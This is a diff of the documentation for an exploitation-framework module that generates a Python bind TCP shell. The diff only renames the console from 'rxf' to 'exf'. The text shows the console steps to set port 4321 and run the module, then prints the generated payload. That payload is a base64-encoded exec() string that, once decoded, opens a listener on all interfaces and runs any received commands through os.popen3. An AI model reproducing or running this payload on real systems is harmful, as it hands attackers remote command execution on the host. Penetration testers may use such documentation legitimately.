@@ -4,7 +4,7 @@ Module generates payload that creates interactive tcp bind shell by using python
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./exf.py`
   2. Do: `use payloads/python/bind_tcp`
   3. Do: `set rport 4321`
   4. Do: `run`
@@ -13,10 +13,10 @@ Module generates payload that creates interactive tcp bind shell by using python
 ## Scenarios
 
 ```
-rxf > use payloads/python/bind_tcp
-rxf (Python Bind TCP) > set rport 4321
+exf > use payloads/python/bind_tcp
+exf (Python Bind TCP) > set rport 4321
 [+] rport => 4321
-rxf (Python Bind TCP) > run
+exf (Python Bind TCP) > run
 [*] Running module...
 [*] Generating payload
 exec('aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uYmluZCgoJzAuMC4wLjAnLDQzMjEpKQpzby5saXN0ZW4oMSkKc28sYWRkcj1zby5hY2NlcHQoKQp4PUZhbHNlCndoaWxlIG5vdCB4OgoJZGF0YT1zby5yZWN2KDEwMjQpCglzdGRpbixzdGRvdXQsc3RkZXJyLD1vcy5wb3BlbjMoZGF0YSkKCXN0ZG91dF92YWx1ZT1zdGRvdXQucmVhZCgpK3N0ZGVyci5yZWFkKCkKCXNvLnNlbmQoc3Rkb3V0X3ZhbHVlKQo='.decode('base64'))
